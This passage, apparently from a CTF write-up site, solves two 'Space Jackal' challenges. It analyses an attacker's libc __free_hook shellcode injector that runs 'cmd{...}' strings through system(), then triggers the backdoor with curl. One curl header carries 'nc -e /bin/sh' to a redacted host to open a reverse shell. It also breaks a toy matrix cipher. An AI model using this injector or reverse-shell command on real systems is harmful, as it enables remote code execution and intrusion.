'\\x48\\xb8\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x55\\x49\\xbd\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x41\\x54\\x49\\x89\\xfc\\x55\\x53\\x4c\\x89\\xe3\\x52\\xff\\xd0\\x48\\x89\\xc5\\x48\\xb8\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x48\\xc7\\x00\\x00\\x00\\x00\\x00\\x48\\x83\\xfd\\x05\\x76\\x61\\x80\\x3b\\x63\\x75\\x54\\x80\\x7b\\x01\\x6d\\x75\\x4e\\x80\\x7b\\x02\\x64\\x75\\x48\\x80\\x7b\\x03\\x7b\\x75\\x42\\xc6\\x03\\x00\\x48\\x8d\\x7b\\x04\\x48\\x8d\\x55\\xfc\\x48\\x89\\xf8\\x8a\\x08\\x48\\x89\\xc3\\x48\\x89\\xd5\\x48\\x8d\\x40\\x01\\x48\\x8d\\x52\\xff\\x8d\\x71\\xe0\\x40\\x80\\xfe\\x5e\\x77\\x1b\\x80\\xf9\\x7d\\x75\\x08\\xc6\\x03\\x00\\x41\\xff\\xd5\\xeb\\x0e\\x48\\x83\\xfa\\x01\\x75\\xd4\\xbd\\x01\\x00\\x00\\x00\\x48\\x89\\xc3\\x48\\xff\\xc3\\x48\\xff\\xcd\\xeb\\x99\\x48\\xb8\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x4c\\x89\\xe7\\xff\\xd0\\x48\\xb8\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x48\\xa3\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x58\\x5b\\x5d\\x41\\x5c\\x41\\x5d\\xc3' shellcode = $( patch_shellcode $shellcode '\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41' $( pack_addr $malloc_usable_addr )) shellcode = $( patch_shellcode $shellcode '\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42' $( pack_addr $free_addr )) shellcode = $( patch_shellcode $shellcode '\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x43' $( pack_addr $system_addr )) shellcode = $( patch_shellcode $shellcode '\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x44' $( pack_addr $free_hook_addr )) shellcode_length = $( echo -ne $shellcode | wc -c ) shellcode_addr = $(( $libc_exec_addr - $shellcode_length )) shellcode = $( patch_shellcode $shellcode '\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55' $( pack_addr $shellcode_addr )) mem_write $target_PID $shellcode_addr $shellcode mem_write $target_PID $free_hook_addr $( pack_addr $shellcode_addr ) echo 'Shellcode: ' $shellcode echo 'Shellcode address: ' $shellcode_addr echo 'libc_exec address: ' $libc_exec_addr echo 'free() hook address: ' $free_hook_addr } if [ $# -ne 1 ] || [ ! -e \"/proc/ $1 \" ] ; then exit 42 fi exploit $1 The script takes a PID of a process, then looks for information on libc in the process: 37 38 39 libc_info = $( grep -E \"/libc.*so $ \" \"/proc/ $target_PID /maps\" | head -n 1 | tr -s ' ' ) libc_base = $(( 0 x $( cut -d '-' -f1 <<< \" $libc_info \" ))) libc_filename = $( cut -d ' ' -f6 <<< \" $libc_info \" ) Next, it looks for the addresses of specific functions inside libc , specifically system() , free() , malloc_usable_addr() , and __free_hook() : 41 42 43 44 free_hook_addr = $(( libc_base+ $( find_addr $libc_filename __free_hook ))) system_addr = $(( libc_base+ $( find_addr $libc_filename system ))) free_addr = $(( libc_base+ $( find_addr $libc_filename free ))) malloc_usable_addr = $(( libc_base+ $( find_addr $libc_filename malloc_usable_size ))) Finally, it looks for the end of the exec section of libc : 46 libc_exec_addr = $(( 0 x $( grep -E \"/libc.*so $ \" \"/proc/ $target_PID /maps\" | grep 'r-xp' | head -n 1 | tr -s ' ' | cut -d ' ' -f1 | cut -d '-' -f2 ))) The next lines contain what looks like shellcode, with code to patch the shellcode with the addresses of the functions found above: 48 49 50 51 52 53 54 55 shellcode = '\\x48\\xb8\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x55\\x49\\xbd\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x41\\x54\\x49\\x89\\xfc\\x55\\x53\\x4c\\x89\\xe3\\x52\\xff\\xd0\\x48\\x89\\xc5\\x48\\xb8\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x48\\xc7\\x00\\x00\\x00\\x00\\x00\\x48\\x83\\xfd\\x05\\x76\\x61\\x80\\x3b\\x63\\x75\\x54\\x80\\x7b\\x01\\x6d\\x75\\x4e\\x80\\x7b\\x02\\x64\\x75\\x48\\x80\\x7b\\x03\\x7b\\x75\\x42\\xc6\\x03\\x00\\x48\\x8d\\x7b\\x04\\x48\\x8d\\x55\\xfc\\x48\\x89\\xf8\\x8a\\x08\\x48\\x89\\xc3\\x48\\x89\\xd5\\x48\\x8d\\x40\\x01\\x48\\x8d\\x52\\xff\\x8d\\x71\\xe0\\x40\\x80\\xfe\\x5e\\x77\\x1b\\x80\\xf9\\x7d\\x75\\x08\\xc6\\x03\\x00\\x41\\xff\\xd5\\xeb\\x0e\\x48\\x83\\xfa\\x01\\x75\\xd4\\xbd\\x01\\x00\\x00\\x00\\x48\\x89\\xc3\\x48\\xff\\xc3\\x48\\xff\\xcd\\xeb\\x99\\x48\\xb8\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x4c\\x89\\xe7\\xff\\xd0\\x48\\xb8\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x48\\xa3\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x58\\x5b\\x5d\\x41\\x5c\\x41\\x5d\\xc3' shellcode = $( patch_shellcode $shellcode '\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41' $( pack_addr $malloc_usable_addr )) shellcode = $( patch_shellcode $shellcode '\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42' $( pack_addr $free_addr )) shellcode = $( patch_shellcode $shellcode '\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x43' $( pack_addr $system_addr )) shellcode = $( patch_shellcode $shellcode '\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x44' $( pack_addr $free_hook_addr )) shellcode_length = $( echo -ne $shellcode | wc -c ) shellcode_addr = $(( $libc_exec_addr - $shellcode_length )) shellcode = $( patch_shellcode $shellcode '\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55' $( pack_addr $shellcode_addr )) Finally, the script writes the shellcode to the end of the libc exec section of memory in the process, and overwrites the address of __free_hook() with the address of the shellcode. To discover what the shellcode does, we can use the pwntools library to disassemble the shellcode, then use ghidra to decompile the shellcode to C (as I'm not great at assembly code). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #!/usr/bin/env from pwn import * # Set the context: 64-bit architecture on Linux context . update ( arch = 'amd64' , os = 'linux' ) # The shellcode shellcode = b ' \\x48\\xb8\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x55\\x49\\xbd ' ' \\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x41\\x54\\x49\\x89\\xfc\\x55\\x53\\x4c ' ' \\x89\\xe3\\x52\\xff\\xd0\\x48\\x89\\xc5\\x48\\xb8\\x44\\x44\\x44\\x44\\x44\\x44 ' ' \\x44\\x44\\x48\\xc7\\x00\\x00\\x00\\x00\\x00\\x48\\x83\\xfd\\x05\\x76\\x61\\x80 ' ' \\x3b\\x63\\x75\\x54\\x80\\x7b\\x01\\x6d\\x75\\x4e\\x80\\x7b\\x02\\x64\\x75\\x48 ' ' \\x80\\x7b\\x03\\x7b\\x75\\x42\\xc6\\x03\\x00\\x48\\x8d\\x7b\\x04\\x48\\x8d\\x55 ' ' \\xfc\\x48\\x89\\xf8\\x8a\\x08\\x48\\x89\\xc3\\x48\\x89\\xd5\\x48\\x8d\\x40\\x01 ' ' \\x48\\x8d\\x52\\xff\\x8d\\x71\\xe0\\x40\\x80\\xfe\\x5e\\x77\\x1b\\x80\\xf9\\x7d ' ' \\x75\\x08\\xc6\\x03\\x00\\x41\\xff\\xd5\\xeb\\x0e\\x48\\x83\\xfa\\x01\\x75\\xd4 ' ' \\xbd\\x01\\x00\\x00\\x00\\x48\\x89\\xc3\\x48\\xff\\xc3\\x48\\xff\\xcd\\xeb\\x99 ' ' \\x48\\xb8\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x4c\\x89\\xe7\\xff\\xd0\\x48 ' ' \\xb8\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x48\\xa3\\x44\\x44\\x44\\x44\\x44 ' ' \\x44\\x44\\x44\\x58\\x5b\\x5d\\x41\\x5c\\x41\\x5d\\xc3 ' # Same the assembly to 'injector.as' with open ( 'injector.as' , 'w' ) as as_file : as_file . write ( disasm ( shellcode )) # And save the binary to 'injector.bin' with open ( 'injector.bin' , 'wb' ) as binfile : binfile . write ( shellcode ) The resulting assembly: 0: 48 b8 41 41 41 41 41 movabs rax , 0x4141414141414141 7: 41 41 41 a: 41 55 push r13 c: 49 bd 43 43 43 43 43 movabs r13 , 0x4343434343434343 13: 43 43 43 16: 41 54 push r12 18: 49 89 fc mov r12 , rdi 1 b: 55 push rbp 1 c: 53 push rbx 1 d: 4 c 89 e3 mov rbx , r12 20: 52 push rdx 21: ff d0 call rax 23: 48 89 c5 mov rbp , rax 26: 48 b8 44 44 44 44 44 movabs rax , 0x4444444444444444 2 d: 44 44 44 30: 48 c7 00 00 00 00 00 mov QWORD PTR [ rax ], 0x0 37: 48 83 fd 05 cmp rbp , 0x5 3 b: 76 61 jbe 0x9e 3 d: 80 3 b 63 cmp BYTE PTR [ rbx ], 0x63 40: 75 54 jne 0x96 42: 80 7 b 01 6 d cmp BYTE PTR [ rbx + 0x1 ], 0x6d 46: 75 4 e jne 0x96 48: 80 7 b 02 64 cmp BYTE PTR [ rbx + 0x2 ], 0x64 4 c: 75 48 jne 0x96 4 e: 80 7 b 03 7 b cmp BYTE PTR [ rbx + 0x3 ], 0x7b 52: 75 42 jne 0x96 54: c6 03 00 mov BYTE PTR [ rbx ], 0x0 57: 48 8 d 7 b 04 lea rdi , [ rbx + 0x4 ] 5 b: 48 8 d 55 fc lea rdx , [ rbp - 0x4 ] 5 f: 48 89 f8 mov rax , rdi 62: 8 a 08 mov cl , BYTE PTR [ rax ] 64: 48 89 c3 mov rbx , rax 67: 48 89 d5 mov rbp , rdx 6 a: 48 8 d 40 01 lea rax , [ rax + 0x1 ] 6 e: 48 8 d 52 ff lea rdx , [ rdx - 0x1 ] 72: 8 d 71 e0 lea esi , [ rcx - 0x20 ] 75: 40 80 fe 5 e cmp si l , 0x5e 79: 77 1 b ja 0x96 7 b: 80 f9 7 d cmp cl , 0x7d 7 e: 75 08 jne 0x88 80: c6 03 00 mov BYTE PTR [ rbx ], 0x0 83: 41 ff d5 call r13 86: eb 0 e jmp 0x96 88: 48 83 fa 01 cmp rdx , 0x1 8 c: 75 d4 jne 0x62 8 e: bd 01 00 00 00 mov ebp , 0x1 93: 48 89 c3 mov rbx , rax 96: 48 ff c3 inc rbx 99: 48 ff cd dec rbp 9 c: eb 99 jmp 0x37 9 e: 48 b8 42 42 42 42 42 movabs rax , 0x4242424242424242 a5: 42 42 42 a8: 4 c 89 e7 mov rdi , r12 ab: ff d0 call rax ad: 48 b8 55 55 55 55 55 movabs rax , 0x5555555555555555 b4: 55 55 55 b7: 48 a3 44 44 44 44 44 movabs ds : 0x4444444444444444 , rax be: 44 44 44 c1: 58 pop rax c2: 5 b pop rbx c3: 5 d pop rbp c4: 41 5 c pop r12 c6: 41 5 d pop r13 c8: c3 ret Firing up ghidra and importing injector.bin (setting the file type as Raw binary and the Language as x86:64:gcc ): we can disassemble the binary code, then see the resulting decompiled C : 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 /* WARNING: Globals starting with '_' overlap smaller symbols at the same address */ undefined8 UndefinedFunction_00000000 ( char * param_1 , undefined8 param_2 , undefined8 param_3 ) { char * pcVar1 ; ulong uVar2 ; ulong uVar3 ; char * pcVar4 ; uVar3 = ( * ( code * ) malloc_usable_size (); _DAT___free_hook = 0 ; pcVar4 = param_1 ; do { if ( uVar3 < 6 ) { ( * ( code * ) __free_hook ( param_1 ); _DAT___free_hook = ( shellcode_addr ); return param_3 ; } if (((( * pcVar4 == 'c' ) && ( pcVar4 [ 1 ] == 'm' )) && ( pcVar4 [ 2 ] == 'd' )) && ( pcVar4 [ 3 ] == '{' )) { * pcVar4 = '\\0' ; pcVar4 = pcVar4 + 4 ; uVar3 = uVar3 - 4 ; do { pcVar1 = pcVar4 + 1 ; uVar2 = uVar3 - 1 ; if ( 0x5e < ( byte )( * pcVar4 - 0x20U )) goto LAB_00000096 ; if ( * pcVar4 == '}' ) { * pcVar4 = '\\0' ; ( * ( code * ) system (); goto LAB_00000096 ; } pcVar4 = pcVar1 ; uVar3 = uVar2 ; } while ( uVar2 != 1 ); uVar3 = 1 ; } LAB_00000096 : pcVar4 = pcVar4 + 1 ; uVar3 = uVar3 - 1 ; } while ( true ); } The important line is: 21 if (((( * pcVar4 == 'c' ) && ( pcVar4 [ 1 ] == 'm' )) && ( pcVar4 [ 2 ] == 'd' )) && ( pcVar4 [ 3 ] == '{' )) { The shellcode is looking for the string cmd{ in a block of memory passed to malloc() . If it sees that string in the memory block, it saves the next characters until } is found. It then calls system() to execute the string. This is the backdoor rudi planted in the system. Now that we've identified how the backdoor works, we need to determine how rudi (and us) can take advantage of it remotely. Using the run.sh script, we can launch the snapshot image of the server, which drops us into a root shell in the snapshot: [root@fedora injector]# ./run.sh Restoring snapshot compromised (art_ctf_injector_local.qcow2) Press Return... root@injector-local:~# id uid=0(root) gid=0(root) groups=0(root) Running ss -ltpn will show us what ports open and which processes have them open: root@injector-local:~# ss -ltpn State Recv-Q Send-Q Local Address:Port Peer Address:Port Process LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* users:((\"systemd-resolve\",pid=363,fd=13)) LISTEN 0 128 0.0.0.0:3322 0.0.0.0:* users:((\"sshd\",pid=377,fd=3)) LISTEN 0 511 0.0.0.0:4321 0.0.0.0:* users:((\"nginx\",pid=380,fd=6),(\"nginx\",pid=379,fd=6)) LISTEN 0 128 [::]:3322 [::]:* users:((\"sshd\",pid=377,fd=4)) sshd is listening on 3322 , and nginx on 4321 . The exploit code is still sitting in /tmp/.hax/injector.sh , so we can run it with the PID of nginx (380) : root@injector-local:~# /tmp/.hax/injector.sh 380 root@injector-local:~# Sending a curl command to the web server with a header containing the exploit command should cause the exploit to run: root@injector-local:~# curl -H 'X-Header: cmd{cp /etc/passwd /tmp}' http://localhost:4321 <!DOCTYPE html> <html> <head> <title>Welcome to nginx!</title> <style> body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } </style> </head> <body> <h1>Welcome to nginx!</h1> <p>If you see this page, the nginx web server is successfully installed and working. Further configuration is required.</p> <p>For online documentation and support please refer to <a href=\"http://nginx.org/\">nginx.org</a>.<br/> Commercial support is available at <a href=\"http://nginx.com/\">nginx.com</a>.</p> <p><em>Thank you for using nginx.</em></p> </body> </html> root@injector-local:~# ls -l /tmp total 16 -rw-r--r-- 1 www-data www-data 1778 Jan 29 03:47 passwd And we see the exploit did run: /etc/passwd has been copied to /tmp , by the user www-data . Finally, we're ready to exploit this on the real system injector.challenges.adversary.zone . On an Internet-accessible host, start a netcat listener on a port, then send a curl request to the server: xps15$ curl -H 'Host: cmd{nc -n -e /bin/sh ###.##.###.## 12345}' http://injector.challenges.adversary.zone:4321 We'll get a shell connected to the netcat listener on our host. As in the test, it's running as www-data . There is a symlink /flag.txt pointing to /home/user , the contents of which is the answer for this challenge. Also in the user's home directory is the non-obfuscated version of the exploit script, and a script to start it when the server reboots: remote$ nc -vnlp 12345 Received connection from ::ffff:167.99.209.243 port 50798 pwd / id uid=33(www-data) gid=33(www-data) groups=33(www-data) ls -l total 64 lrwxrwxrwx 1 root root 7 Oct 22 13:58 bin -> usr/bin drwxr-xr-x 3 root root 4096 Dec 17 15:16 boot drwxr-xr-x 2 root root 4096 Dec 17 14:59 cdrom drwxr-xr-x 17 root root 3860 Jan 28 03:59 dev drwxr-xr-x 92 root root 4096 Jan 12 14:56 etc lrwxrwxrwx 1 root root 19 Jan 12 12:57 flag -> /home/user/flag.txt lrwxrwxrwx 1 root root 19 Jan 12 12:10 flag.txt -> /home/user/flag.txt drwxr-xr-x 3 root root 4096 Dec 17 15:07 home ... cd /home/user ls -l total 12 -rw-r--r-- 1 root root 23 Jan 12 12:08 flag.txt -rwxr-xr-x 1 root root 3027 Jan 12 14:59 injector.sh -rwxr-xr-x 1 root root 246 Jan 12 15:21 start.sh cat flag.txt CS{fr33_h00k_b4ckd00r}","title":"Solution"},{"location":"SpaceJackal/injector/#answer","text":"CS{fr33_h00k_b4ckd00r}","title":"Answer"},{"location":"SpaceJackal/matrix/","text":"SPACE JACKAL - Matrix # A bit more difficult of a challenge: reverse-engineering a custom encryption program to decipher messages from the SPACE JACKAL hidden forum. Challenge description # With the help of your analysis, we got onto the trail of the group and found their hidden forum on the Deep Dark Web . Unfortunately, all messages are encrypted. While we believe that we have found their encryption tool, we are unsure how to decrypt these messages. Can you assist? Solution # The 'forum' with the messages is a TOR site: http://spacesftw5q4uyamog5qgcf75a5hbhmr2g24jqsdcpjnew63zkq7ueyd.onion/ . Using TAILS & the TOR Browser , we can retrieve the messages: Welcome on board! 259F8D014A44C2BE8FC573EAD944BA63 21BB02BE026D599AA43B7AE224E221CF 00098D47F8FFF3A7DBFF21376FF4EB79 B01B8877012536C10394DF7A943731F8 9117B49349E078809EA2EECE4AA86D84 4E94DF7A265574A379EB17E4E1905DB8 49280BD0040C23C98B05F160905DB849 280B6CB9DFECC6C09A0921314BD94ABF 3049280B5BFD8953CA73C8D1F6D0040C 1B967571354BAAB7992339507BBB59C6 5CDA5335A7D575C970F1C9D0040C23C9 8B08F78D3F40B198659B4CB137DEB437 08EB47FB978EF4EB7919BF3E97EA5F40 9F5CF66370141E345024AC7BB966AEDF 5F870F407BB9666F7C4DC85039CBD819 994515C4459F1B96750716906CB9DF34 5106F58B3448E12B87AFE754C0DD802C 41C25C7AAAFF7900B574FC6867EA35C5 BB4E51542C2D0B5645FB9DB1C6D12C8E F62524A12D5D5E622CD443E02515E7EB 991ACCC0C08CE8783F7E2BAD4B16D758 530C79003E5ED61DFE2BE70F50A6F9CA 288C Let's fight back! 259F8D014A44C2BE8F7FA3BC3656CFB3 DF178DEA8313DBD33A8BAC2CD4432D66 3BC75139ECC6C0FFFBB38FB17F448C08 17BF508074D723AAA722D4239328C6B3 7F57C0A5249EA4E79B780DF081E997C0 6058F702E2BF9F50C4EC1B5966DF27EC 56149F253325CFE57A00B57494692921 94F383A3535024ACA7009088E70E6128 9BD30B2FCFE57A00B5749469292194F3 83A3533BAB08CA7FD9DC778386803149 280BE0895C0984C6DC77838C2085B10B 3ED0040C3759B05029F8085EDBE26DE3 DF25AA87CE0BBBD1169B780D1BCAA097 9A6412CCBE5B68BD2FB780C5DBA34137 C102DBE48D3F0AE471B77387E7FA8BEC 305671785D725930C3E1D05B8BD884C0 A5246EF0BF468E332E0E70009CCCB4C2 ED84137DB4C2EDE078807E1616AA9A7F 4055844821AB16F842 FLAGZ! 259F8D014A44C2BE8FC50A5A2C1EF0C1 3D7F2E0E70009CCCB4C2ED84137DB4C2 EDE078807E1616C266D5A15DC6DDB60E 4B7337E851E739A61EED83D2E06D6184 11DF61222EED83D2E06D612C8EB5294B CD4954E0855F4D71D0F06D05EE We're given the the Python used to encrypt the messages, but no indication of the key used to encrypt: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 #!/usr/bin/env python3 # -*- coding: utf-8 -*- ''' , /| , ,--.________/ /-----/|-------------------------------------.._ ( /_/_/_/_ |--------- DEATH TO ALL TABS ---------------< _`> `--\u00b4 \\ \\-----\\|-------------------------------------''\u00b4 \\| ' ''' # ' assert __name__ == '__main__' import sys def die ( E ): # print(F'E:',E,file=sys.stderr) sys . exit ( 1 ) T = lambda A , B , C , D , E , F , G , H , I : A * E * I + B * F * G + C * D * H - G * E * C - H * F * A - I * D * B & 255 def U ( K ): R = pow ( T ( * K ), - 1 , 256 ) A , B , C , D , E , F , G , H , I = K return [ R * V % 256 for V in [ E * I - F * H , C * H - B * I , B * F - C * E , F * G - D * I , A * I - C * G , C * D - A * F , D * H - E * G , B * G - A * H , A * E - B * D ]] def C ( K , M ): B = lambda A , B , C , D , E , F , G , H , I , X , Y , Z : bytes (( A * X + B * Y + C * Z & 0xFF , D * X + E * Y + F * Z & 0xFF , G * X + H * Y + I * Z & 0xFF )) N = len ( M ) R = N % 3 R = R and 3 - R M = M + R * B ' \\0 ' return B '' . join ( B ( * K , * W ) for W in zip ( * [ iter ( M )] * 3 )) . rstrip ( B ' \\0 ' ) len ( sys . argv ) == 3 or die ( 'FOOL' ) K = bytes ( sys . argv [ 2 ], 'ascii' ) len ( K ) == 9 and T ( * K ) & 1 or die ( 'INVALID' ) M = sys . stdin . read () if sys . argv [ 1 ] . upper () == 'E' : M = B 'SPACEARMY' + bytes ( M , 'ascii' ) print ( C ( U ( K ), M ) . hex () . upper ()) else : M = C ( K , bytes . fromhex ( M )) M [: 9 ] == B 'SPACEARMY' or die ( 'INVALID' ) print ( M [ 9 :] . decode ( 'ascii' )) From the code, we can determine a few things about how the program works: The program expects two arguments: 29 len ( sys . argv ) == 3 or die ( 'FOOL' ) The key is in the ASCII character set: 30 K = bytes ( sys . argv [ 2 ], 'ascii' ) The key is 9 characters long, and the lowest bit of the key is 1 : 31 len ( K ) == 9 and T ( * K ) & 1 or die ( 'INVALID' ) And very importantly, we know that the first 9 characters of every message is the string SPACEARMY : 33 34 35 36 37 38 39 if sys . argv [ 1 ] . upper () == 'E' : M = B 'SPACEARMY' + bytes ( M , 'ascii' ) print ( C ( U ( K ), M ) . hex () . upper ()) else : M = C ( K , bytes . fromhex ( M )) M [: 9 ] == B 'SPACEARMY' or die ( 'INVALID' ) print ( M [ 9 :] . decode ( 'ascii' )) This gives a set of known plaintext->ciphertext values that we can use to derive the key and decrypt the rest of the message. The encryption is performed by the function C() : 21 22 23 24 25 26 27 28 def C ( K , M ): B = lambda A , B , C , D , E , F , G , H , I , X , Y , Z : bytes (( A * X + B * Y + C * Z & 0xFF , D * X + E * Y + F * Z & 0xFF , G * X + H * Y + I * Z & 0xFF )) N = len ( M ) R = N % 3 R = R and 3 - R M = M + R * B ' \\0 ' return B '' . join ( B ( * K , * W ) for W in zip ( * [ iter ( M )] * 3 )) . rstrip ( B ' \\0 ' ) Lines 22/23 perform the encryption: the first 3 values of the plaintext bytes ( X , Y , and Z ) multiplied by the first 3 bytes of the key ( A , B , and C ), added together, then the lower 8 bits are returned for the first byte of the ciphertext. The calculation is repeated with the same byte of plaintext X Y and Z , with the remaining bytes of the key in sets of 3: D E F , and G H I . On it's own, knowing the algorithm isn't enough to be able to decipher the messages. But with the phrase SPACEARMY prepended to the message before encryption, we can use that known plaintext with the first 9 bytes of the ciphertext to compute the key. Using the nomenclature from the encryption routine, the computations work out like this: PT[] = Plaintext CT[] = Ciphertext A-I = bytes of the key, eg A = K[0], B = K[1], ... CT[0] = ((A * PT[0]) + (B * PT[1]) + (C * PT[2])) & 0xFF CT[1] = ((D * PT[0]) + (E * PT[1]) + (F * PT[2])) & 0xFF CT[2] = ((G * PT[0]) + (H * PT[1]) + (I * PT[2])) & 0xFF CT[3] = ((A * PT[3]) + (B * PT[4]) + (C * PT[5])) & 0xFF CT[4] = ((D * PT[3]) + (E * PT[4]) + (F * PT[5])) & 0xFF CT[5] = ((G * PT[3]) + (H * PT[4]) + (I * PT[5])) & 0xFF CT[6] = ((A * PT[6]) + (B * PT[7]) + (C * PT[8])) & 0xFF CT[7] = ((D * PT[6]) + (E * PT[7]) + (F * PT[8])) & 0xFF CT[8] = ((G * PT[6]) + (H * PT[7]) + (I * PT[8])) & 0xFF ... Re-arranging the calculations to combine the common key values gives this: CT[0] = ((A * PT[0]) + (B * PT[1]) + (C * PT[2])) & 0xFF CT[3] = ((A * PT[3]) + (B * PT[4]) + (C * PT[5])) & 0xFF CT[6] = ((A * PT[6]) + (B * PT[7]) + (C * PT[8])) & 0xFF CT[1] = ((D * PT[0]) + (E * PT[1]) + (F * PT[2])) & 0xFF CT[4] = ((D * PT[3]) + (E * PT[4]) + (F * PT[5])) & 0xFF CT[7] = ((D * PT[6]) + (E * PT[7]) + (F * PT[8])) & 0xFF CT[2] = ((G * PT[0]) + (H * PT[1]) + (I * PT[2])) & 0xFF CT[5] = ((G * PT[3]) + (H * PT[4]) + (I * PT[5])) & 0xFF CT[8] = ((G * PT[6]) + (H * PT[7]) + (I * PT[8])) & 0xFF We have 3 equations, with 3 unknowns ( A B C , D E F , G H I ). The following Python code takes reads the ciphertext from stdin , converts it from hex to bytes , then uses the known plaintext SPACEARMY to brute-force the key: #!/usr/bin/env python3 # Decrypt SPACE JACKAL's encrypted messages # # Joe Ammond (pugpug), @joeammond import sys # Brute-force the solution to the equations: # ((X * A) + (Y * B) + (Z * C)) & 0xFF == v1 # ((X * D) + (Y * E) + (Z * F)) & 0xFF == v2 # ((X * G) + (Y * H) + (Z * I)) & 0xFF == v3 def solve ( v1 , v2 , v3 , K ): '''Solve 3 equations/3 unknowns. K = key, 9 bytes long''' A , B , C , D , E , F , G , H , I = K for X in range ( 255 ): for Y in range ( 255 ): for Z in range ( 255 ): if (( X * ord ( A )) + ( Y * ord ( B )) + ( Z * ord ( C ))) & 0xFF == v1 and \\ (( X * ord ( D )) + ( Y * ord ( E )) + ( Z * ord ( F ))) & 0xFF == v2 and \\ (( X * ord ( G )) + ( Y * ord ( H )) + ( Z * ord ( I ))) & 0xFF == v3 : return ( X , Y , Z ) # Read the ciphertext from stdin, and convert from hex to bytes C = sys . stdin . read () C = bytes . fromhex ( C ) # Key array K = '' # For each set of 3 key elements, solve for the known plaintext of 'SPACEARMY' for i in range ( 3 ): k1 , k2 , k3 = solve ( C [ i ], C [ i + 3 ], C [ i + 6 ], 'SPACEARMY' ) K = K + chr ( k1 ) + chr ( k2 ) + chr ( k3 ) print ( 'Key values found:' , ' ' . join ( ' %02x ' % ord ( K [ i ]) for i in range ( len ( K )))) print () Piping in one of the cipher texts will reveal the bytes of the key used to encrypt the message: xps15$ python3 decrypt.py < cipher1.txt Key values found: cf 1c 48 4c df 8b 6d 0b 46 Now that we have the key used to encrypt the messages, we can use the same function to decrypt the rest of the message. Adding the following to the program will decrypt and print the message: # Now we have the key, brute-force the message text from the ciphertext. Strip off the # 'SPACEARMY' header from the message first. C = C [ 9 :] # Plaintext string P = '' for X , Y , Z in zip ( * [ iter ( C )] * 3 ): p1 , p2 , p3 = solve ( X , Y , Z , K ) P = P + chr ( p1 ) + chr ( p2 ) + chr ( p3 ) print ( P ) And now we can decrypt the 3 messages from the Deep Dark Web forum: Message 1: Welcome on board! # xps15$ python3 decrypt.py < cipher1.txt Key values found: cf 1c 48 4c df 8b 6d 0b 46 Welcome on board and congratulations on joining the Order of 0x20. Together we will fight the good fight and bring enlightenment to the non-believers: Let's stop the global TAB infestation once and for all. This forum is a place to share news and coordinate action, but be careful: you never know who's watching. 040 == 32 == 0x20 -- admin. Message 2: Let's fight back! # xps15$ python3 decrypt.py < cipher2.txt Key values found: cf 1c 48 4c df 8b 6d 0b 46 My name is rudi. i was fired by my Old employer because I refused to use TABs. THIS madness must be STOPPED! These people must be STOPPED!1! But I fought back! I hacked their network established access. Let me know if you have an idea how to take revegne! 040 == 32 == 0x20 -- rudi. Message 3: FLAGZ! # xps15$ python3 decrypt.py < cipher3.txt Key values found: cf 1c 48 4c df 8b 6d 0b 46 Good job! 040 == 32 == 0x20 CS{if_computers_could_think_would_they_like_spaces?} Answer # CS{if_computers_could_think_would_they_like_spaces?}","title":"Space Jackal - Matrix"},{"location":"SpaceJackal/matrix/#space-jackal-matrix","text":"A bit more difficult of a challenge: reverse-engineering a custom encryption program to decipher messages from the SPACE JACKAL hidden forum.","title":"SPACE JACKAL - Matrix"},{"location":"SpaceJackal/matrix/#challenge-description","text":"With the help of your analysis, we got onto the trail of the group and found their hidden forum on the Deep Dark Web . Unfortunately, all messages are encrypted. While we believe that we have found their encryption tool, we are unsure how to decrypt these messages. Can you assist?","title":"Challenge description"},{"location":"SpaceJackal/matrix/#solution","text":"The 'forum' with the messages is a TOR site: http://spacesftw5q4uyamog5qgcf75a5hbhmr2g24jqsdcpjnew63zkq7ueyd.onion/ . Using TAILS & the TOR Browser , we can retrieve the messages: Welcome on board! 259F8D014A44C2BE8FC573EAD944BA63 21BB02BE026D599AA43B7AE224E221CF 00098D47F8FFF3A7DBFF21376FF4EB79 B01B8877012536C10394DF7A943731F8 9117B49349E078809EA2EECE4AA86D84 4E94DF7A265574A379EB17E4E1905DB8 49280BD0040C23C98B05F160905DB849 280B6CB9DFECC6C09A0921314BD94ABF 3049280B5BFD8953CA73C8D1F6D0040C 1B967571354BAAB7992339507BBB59C6 5CDA5335A7D575C970F1C9D0040C23C9 8B08F78D3F40B198659B4CB137DEB437 08EB47FB978EF4EB7919BF3E97EA5F40 9F5CF66370141E345024AC7BB966AEDF 5F870F407BB9666F7C4DC85039CBD819 994515C4459F1B96750716906CB9DF34 5106F58B3448E12B87AFE754C0DD802C 41C25C7AAAFF7900B574FC6867EA35C5 